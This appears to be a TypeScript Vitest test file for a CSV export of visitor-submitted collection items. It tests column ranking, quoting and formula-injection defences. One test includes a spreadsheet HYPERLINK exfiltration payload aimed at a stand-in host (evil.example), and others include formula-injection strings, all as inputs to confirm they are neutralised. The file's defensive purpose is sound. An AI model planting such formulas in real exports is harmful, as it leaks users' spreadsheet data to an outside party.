import { describe, expect, it } from "vitest";
import {
  BOM,
  collectionCsv,
  collectionRowCells,
  columnHeader,
  csvCell,
  deriveCollectionColumns,
  MAX_DERIVED_COLUMNS,
  type CollectionColumns,
} from "./collectionTable.js";
import type { CollectionItem } from "./data.js";

/**
 * This file is the specification for the tabular projection of collected items.
 * `item` is anonymous-visitor-supplied JSON, so most of what follows is a
 * security property (which keys can claim a column, what reaches a spreadsheet)
 * rather than a formatting preference.
 */

let seq = 0;
/** A collected item with a distinct id; `item` is whatever the visitor sent. */
function row(item: unknown, over: Partial<CollectionItem> = {}): CollectionItem {
  seq += 1;
  return {
    id: `00000000-0000-0000-0000-${String(seq).padStart(12, "0")}`,
    collection: "contacts",
    env: "prod",
    userOid: null,
    item,
    meta: null,
    createdAt: "2026-08-10T12:00:00.000Z",
    ...over,
  };
}

const cols = (keys: string[]): CollectionColumns => ({ keys, truncated: false });

describe("deriveCollectionColumns", () => {
  it("takes the top-level scalar keys", () => {
    const got = deriveCollectionColumns([row({ email: "a@b.c", name: "A", age: 3, ok: true })]);
    expect(got.keys).toEqual(["email", "name", "age", "ok"]);
    expect(got.truncated).toBe(false);
  });

  it("ranks by how many rows populate the key, not by first appearance", () => {
    // The hostile shape: one early junk row introduces keys nobody else has. A
    // first-seen ordering would let it push `email` off a capped table.
    const items = [
      row({ junk1: "x", junk2: "x", email: "a@b.c" }),
      row({ email: "d@e.f" }),
      row({ email: "g@h.i" }),
    ];
    expect(deriveCollectionColumns(items).keys).toEqual(["email", "junk1", "junk2"]);
  });

  it("ignores a key whose only values are null when ranking", () => {
    const items = [row({ blank: null, email: "a@b.c" }), row({ blank: null, email: "d@e.f" })];
    // `blank` is still a legitimate column (always scalar), just ranked last.
    expect(deriveCollectionColumns(items).keys).toEqual(["email", "blank"]);
  });

  it("breaks equal-count ties by order of first encounter", () => {
    // Encounter order, not alphabetical. NB this is the order of the items as
    // *read back*, which for real data is jsonb's canonical key order — the app's
    // authoring order does not survive storage. The property that matters is that
    // the output is a pure function of the input.
    expect(deriveCollectionColumns([row({ name: "A", email: "a@b.c" })]).keys).toEqual([
      "name",
      "email",
    ]);
    // Order comes from the input, not from Map iteration luck.
    expect(deriveCollectionColumns([row({ b: 1, a: 1 }), row({ a: 1, b: 1 })]).keys).toEqual([
      "b",
      "a",
    ]);
    expect(deriveCollectionColumns([row({ a: 1, b: 1 })]).keys).toEqual(["a", "b"]);
  });

  it("excludes a key that is EVER a non-scalar", () => {
    // A column that renders "—" for the object-valued rows would silently drop
    // data from the export, which is worse than having no column.
    const items = [row({ tags: "a,b", email: "a@b.c" }), row({ tags: ["a", "b"] })];
    expect(deriveCollectionColumns(items).keys).toEqual(["email"]);
  });

  it("never makes a column out of a nested object or array", () => {
    const got = deriveCollectionColumns([row({ nested: { a: 1 }, list: [1], flat: "y" })]);
    expect(got.keys).toEqual(["flat"]);
  });

  it("caps the column count and reports truncation", () => {
    const wide = Object.fromEntries(
      Array.from({ length: MAX_DERIVED_COLUMNS + 3 }, (_, i) => [`k${i}`, i]),
    );
    const got = deriveCollectionColumns([row(wide)]);
    expect(got.keys).toHaveLength(MAX_DERIVED_COLUMNS);
    expect(got.truncated).toBe(true);
  });

  it("honours an explicit max", () => {
    expect(deriveCollectionColumns([row({ a: 1, b: 2, c: 3 })], 2)).toEqual({
      keys: ["a", "b"],
      truncated: true,
    });
  });

  describe("a non-object item contributes no columns", () => {
    // `POST /_api/data/collections/:name` accepts any JSON body, so all of these
    // are reachable from a real app. `typeof null === "object"` is the trap.
    it.each([
      ["null", null],
      ["a string", "hello"],
      ["an array", [1, 2]],
      ["a number", 42],
      ["a boolean", true],
    ])("%s", (_label, item) => {
      expect(deriveCollectionColumns([row(item)])).toEqual({ keys: [], truncated: false });
    });
  });

  it("derives from the object rows and tolerates non-object rows alongside", () => {
    const items = [row({ email: "a@b.c" }), row("garbage"), row({ email: "d@e.f" })];
    expect(deriveCollectionColumns(items).keys).toEqual(["email"]);
  });

  it("returns no columns for an empty set", () => {
    expect(deriveCollectionColumns([])).toEqual({ keys: [], truncated: false });
  });
});

describe("collectionRowCells", () => {
  it("renders falsy scalars as themselves, not as blanks", () => {
    // The naive `value || ""` bug: `false` and `0` are real answers.
    const cells = collectionRowCells(
      row({ subscribed: false, count: 0 }),
      cols(["subscribed", "count"]),
    );
    expect(cells).toEqual([false, 0]);
  });

  it("yields null for both a missing key and an explicit null", () => {
    const cells = collectionRowCells(row({ a: null }), cols(["a", "b"]));
    expect(cells).toEqual([null, null]);
  });

  it("yields null where a row's value is a non-scalar", () => {
    // Only reachable via a column derived from a different row set (the SPA
    // derives from 200 rows, the CSV from up to 10,000) — must not throw.
    expect(collectionRowCells(row({ a: { deep: 1 } }), cols(["a"]))).toEqual([null]);
  });

  it("yields nulls for a non-object item", () => {
    expect(collectionRowCells(row("hello"), cols(["a", "b"]))).toEqual([null, null]);
  });
});

describe("csvCell", () => {
  it("applies RFC-4180 quoting", () => {
    expect(csvCell("a,b")).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("two\nlines")).toBe('"two\nlines"');
    expect(csvCell("plain")).toBe("plain");
  });

  it("neutralises a leading formula character", () => {
    // Quoting alone does not help: Excel evaluates after unquoting.
    expect(csvCell("=1+1")).toBe("'=1+1");
    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(csvCell("\tsneaky")).toBe("'\tsneaky");
  });

  it("neutralises the exfiltration payload, quoting included", () => {
    const attack = '=HYPERLINK("https://evil.example/?x"&A1,"click")';
    const out = csvCell(attack);
    expect(out.startsWith("\"'=")).toBe(true);
    expect(out).toContain('""https://evil.example/?x""');
  });

  it("leaves genuine numbers alone", () => {
    // Mangling `-5` into `'-5` would corrupt real data; a bare number is not a
    // formula, so there is nothing to neutralise.
    expect(csvCell("-5")).toBe("-5");
    expect(csvCell("+3.2")).toBe("+3.2");
    expect(csvCell("-1e3")).toBe("-1e3");
  });

  it("still neutralises something that only starts like a number", () => {
    expect(csvCell("-1+1")).toBe("'-1+1");
    expect(csvCell("-A1")).toBe("'-A1");
  });
});

describe("collectionCsv", () => {
  const items = [
    row({ email: "a@b.c", name: "Ann" }, { env: "prod", userOid: "oid-1" }),
    row({ email: "d@e.f" }, { env: "dev", meta: { ipHash: "abc123" } }),
  ];

  it("puts platform columns first, then namespaced app columns, then the raw JSON", () => {
    const { csv } = collectionCsv(items);
    const header = csv.slice(BOM.length).split("\n")[0];
    expect(header).toBe("id,createdAt,env,userOid,item.email,item.name,item,meta");
  });

  it("anchors the platform columns to both ends, whatever the derived width", () => {
    // The raw columns sit at a different absolute index per collection — only the
    // derived block in between varies. Asserted as a property across two very
    // different shapes, so a reorder trips here rather than in someone's
    // spreadsheet. Anything needing fixed offsets should read the JSON export.
    const headerOf = (item: unknown) =>
      collectionCsv([row(item)])
        .csv.slice(BOM.length)
        .split("\n")[0]!
        .split(",");

    for (const shape of [{ email: "a@b.c" }, { a: 1, b: 2, c: 3, d: 4, e: 5 }, "not an object"]) {
      const cols = headerOf(shape);
      expect(cols.slice(0, 4)).toEqual(["id", "createdAt", "env", "userOid"]);
      expect(cols.slice(-2)).toEqual(["item", "meta"]);
      // Everything between the two anchors is derived, and nothing else is.
      expect(cols.slice(4, -2).every((c) => c.startsWith("item."))).toBe(true);
    }
  });

  it("namespaces app keys so they can never collide with a platform column", () => {
    // An app that posts {"env": "..."} must not shadow the platform's env column.
    const { csv } = collectionCsv([row({ env: "spoofed", id: "spoofed" })]);
    const header = csv.slice(BOM.length).split("\n")[0];
    expect(header).toBe("id,createdAt,env,userOid,item.env,item.id,item,meta");
    expect(columnHeader("env")).toBe("item.env");
  });

  it("does not collide with an app key literally named item.email", () => {
    const { csv } = collectionCsv([row({ "item.email": "x", email: "y" })]);
    const header = csv.slice(BOM.length).split("\n")[0];
    expect(header).toContain("item.item.email");
    expect(header).toContain("item.email,");
  });

  it("leads with a BOM so Excel reads non-ASCII names", () => {
    const { csv } = collectionCsv([row({ name: "José" })]);
    expect(csv.startsWith(BOM)).toBe(true);
    expect(csv).toContain("José");
  });

  it("writes the row values, with an empty cell for a missing key", () => {
    const { csv } = collectionCsv(items);
    const lines = csv.slice(BOM.length).split("\n");
    expect(lines[1]).toContain("prod,oid-1,a@b.c,Ann,");
    // Second row has no `name`, and no userOid → two empty cells.
    expect(lines[2]).toContain("dev,,d@e.f,,");
  });

  it("carries the raw item JSON as a lossless fallback column", () => {
    const { csv } = collectionCsv([row({ nested: { deep: true } })]);
    // `nested` earns no column, so the raw blob is the ONLY place it survives.
    expect(csv).toContain('"{""nested"":{""deep"":true}}"');
  });

  it("exports a non-object item without a column for it", () => {
    const { csv, columns } = collectionCsv([row("just a string")]);
    expect(columns.keys).toEqual([]);
    expect(csv.slice(BOM.length).split("\n")[1]).toContain('"""just a string"""');
  });

  it("neutralises a formula that arrived in a collected value", () => {
    const { csv } = collectionCsv([row({ name: "=1+1" })]);
    expect(csv).toContain("'=1+1");
  });

  it("emits a header-only file for an empty collection", () => {
    const { csv } = collectionCsv([]);
    expect(csv.slice(BOM.length).split("\n")).toEqual(["id,createdAt,env,userOid,item,meta"]);
  });
});
